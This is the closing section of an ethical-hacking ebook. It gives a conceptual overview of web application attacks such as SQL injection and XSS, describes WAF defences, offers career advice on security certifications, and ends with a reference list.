+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-i">I</span>t is the protection</span> of online services and websites from various security threats that seek to take advantage of vulnerabilities in the code of an application. Content management systems such as WordPress, SaaS applications, and database administration tools are the most common targets for these attacks. Attackers always target web applications because: They have a complex source code and are, therefore, likely to have unattended vulnerabilities. There is so much to gain in terms of sensitive private information gathered when a source code is successfully manipulated. The attacks are easy to execute because they can be automated and deployed indiscriminately to thousands upon thousands of targets at once. Web applications that are not secured are at a higher risk of being attacked. The results of these attacks include legal proceedings, revoked licenses, damaged relationships with clients, and information theft. Vulnerabilities are caused by the lack of code sanitization which attackers use to gain access or manipulate the source code. The vulnerabilities allow for the following attack vectors: SQL Injection: an attacker manipulates a backend database using malicious SQL code, giving him access to information. He can then go on and illegally view lists, gain administrative access, or delete tables. Cross-site Scripting (XSS): this is an attack in which the perpetrator targets user so they can modify page content, activate Trojans, or access accounts. Remote File Inclusion: this attack is used to inject a file remotely into a web application server. Malicious code or scripts can then be executed in the application. The attacker may also steal or manipulate data. Cross-site Request Forgery (CSRF): this attack may lead to unauthorized transfer of funds, data thefts, or password changes. It occurs when an attacker uses a malicious web application to make your browser execute unwanted action. Theoretically, thorough input/output sanitization can remove all vulnerabilities and make an application safe from unlawful manipulation. However, complete sanitization is never practical as many applications are in a developmental state continually. Additionally, applications integrate with each other frequently creating a very complex coded environment. Web Application Firewall (WAF) are software and hardware solutions that are used to mitigate application security threats. They are developed to evaluate incoming traffic and block any attack attempts. To deploy a WAF, you do not need to change your application. Various heuristics are used by WAFs to identify the traffic that can interact with an application and that which needs to be blocked. A signature pool that is constantly updated lets them identify bad actors instantly. Most WAFs can be customized to suit a specific security case and to take care of any emerging threats. Other than WAFs, web applications can be secured using other methods. These processes must be in every checklist: Information gathering, review the application manually to know client-side codes and entry points. Authorization: have the application tested for path transversals. Cryptography: ensure that all data transmissions are secured. Denial of service: enhance reinforcement against denial of service threats.</p>
+<p><span id="c038.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Conclusion</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-o">O</span>riginally, the term</span> “hacker” referred to a programmer who was skilled in computer operating systems and machine code. Today, it refers to anyone who performs hacking activities. Hacking is the act of changing a system’s features to attain a goal that is not within the original purpose of the creator. The word “hacking” is usually perceived negatively especially by people who do not understand the job of an ethical hacker. In the hacking world, ethical hackers are good guys. What is their role? They use their vast knowledge of computers for good instead of malicious reasons. They look for vulnerabilities in the computer security of organizations and businesses to prevent bad actors from taking advantage of them. For someone that loves the world of technology and computers, it would be wise to consider an ethical hacking career. You get paid (a good amount) to break into systems. Getting started will not be a walk in the park—just as with any other career. However, if you are determined, you can skyrocket yourself into a lucrative career.  When you decide to get started on this journey, you will have to cultivate patience. The first step for many people is usually to get a degree in computer science. You can also get an A+ certification (CompTIA)—you must take and clear two different exams. To be able to take the qualification test, you need to have not less than 500 hours of experience in practical computing. Experience is required, and a CCNA or Network+ qualification to advance your career. Once you get the necessary qualifications, you are ready to move on to the next stage in network support. In this step, you will do things like updating and monitoring, testing for weakness, and installing security programs. You will need experience in the network security field and your goal should be to become a network engineer. With experience in network support, you can expect to start earning a great salary. Instead of supporting networks, you will be planning and designing them. Since you want to become an ethical hacker, your focus should be on the Security part of things. Work at getting a security certification such as TICSA, CISSP, or Security+. Information Security is very crucial. You will now be in Information Security. Your role will be to evaluate the network and system security, and deal with any security breaches. While working here, focus on penetration testing and try to obtain a CEH (Certified Ethical Hacker) certification. Your main role as an ethical hacker is to use all your security and technical knowledge to try and breach network securities. You will then give a detailed report of your findings and suggestions to improve the network. The average salary for ethical hackers is $71,000 (without bonus payments) or more to freelance depending on experience or skills.</p>
+<p><span id="c039.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">References</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-w">W</span>alker, Matt; </span><span style="font-style: italic">CEH Certified Ethical Hacker All-In-One Exam Guide, The McGraw-Hill Companies, 2011.</span> <span style="font-style: italic">ISBN</span> <span style="font-style: italic">978-0-07-177229-7</span></p>
+<p>Oriyano, Sean-Philip; <span style="font-style: italic">CEH: Certified Ethical Hacker Version 8 Study Guide, Sybex Publishing, 2014.</span> <a href="https://en.wikipedia.org/wiki/International_Standard_Book_Number">ISBN</a> <span style="font-style: italic">978-1-118-64767-7</span></p>
+<p>Gregg, Michael; <span style="font-style: italic">Certified Ethical Hacker Exam Prep, Que Publishing, 2006.</span> <a href="https://en.wikipedia.org/wiki/International_Standard_Book_Number">ISBN</a> <a href="https://en.wikipedia.org/wiki/Special:BookSources/978-0-7897-3531-7">978-0-7897-3531-7</a></p>
+<p>DeFino, Steven; Greenblatt, Larry; <span style="font-style: italic">Official Certified Ethical Hacker Review Guide: for Version 7.1 (EC-Council Certified Ethical Hacker (Ceh)), Delmar Cengage Learning, March 2, 2012.</span> <a href="https://en.wikipedia.org/wiki/International_Standard_Book_Number">ISBN</a> <span style="font-style: italic">978-1-1332-8291-4</span></p>
+<p>IP Specialist; <span style="font-style: italic">CEH v10: EC-Council Certified Ethical Hacker Complete Training Guide with Practice Labs: Exam: 312-50, May 2018,</span> <span style="font-style: italic">ISBN</span> <span style="font-style: italic">978-1983005473</span></p>
+<p>Ric Messier; <span style="font-style: italic">CEH v10 Certified Ethical Hacker Study Guide, Sybex publishing, May 7, 2019.</span></p>
+<p>(Blockmon, 2016)</p>
+<p>(DeFino &amp; Greenblatt, 2012) (Murad, 2008) (Baloch, 2017) (Oriyano, 2017) (Li, et al., 2018) (Juneja, 2013) (Juneja, 2013)</p>
+<p>Himanen, Pekka (2001). <span style="font-style: italic">The Hacker Ethic and the Spirit of the Information Age</span>. Random House.</p>
+<p>Ingo, Henrik (2006). <span style="font-style: italic">Open Life: The Philosophy of Open Source</span></p>
+<p>Raymond, Eric S.; Steele, Guy L., eds. (1996). <a href="https://en.wikipedia.org/wiki/Jargon_File">The New Hacker's Dictionary</a>. The MIT Press. </p>
+<p><span id="other.new_release_sign_up_page.xhtml"></span></p>
+<div class="new-release-sign-up-page">
+<h1>Don't miss out!</h1>
+<p>Click the button below and you can sign up to receive emails whenever Adidas Wilson publishes a new book. There's no charge and no obligation.</p>
+<div class="sign_up_links">
+<div style="width: 199px; display: inline-block;">
+<a href="https://books2read.com/r/B-A-JYCE-ISQX"><img src="d2d_images/new_release_sign_up_button.png" alt="Sign Me Up" width="199" /></a>
+</div>
+<p><a href="https://books2read.com/r/B-A-JYCE-ISQX">https://books2read.com/r/B-A-JYCE-ISQX</a></p>
+</div>
+<div>
+<div style="width: 150px; display: inline-block;">
+<img src="d2d_images/b2r_image.png" alt="books2read" width="150" />
+</div>
+<p>Connecting independent readers to independent writers.</p>
+</div>
+</div>
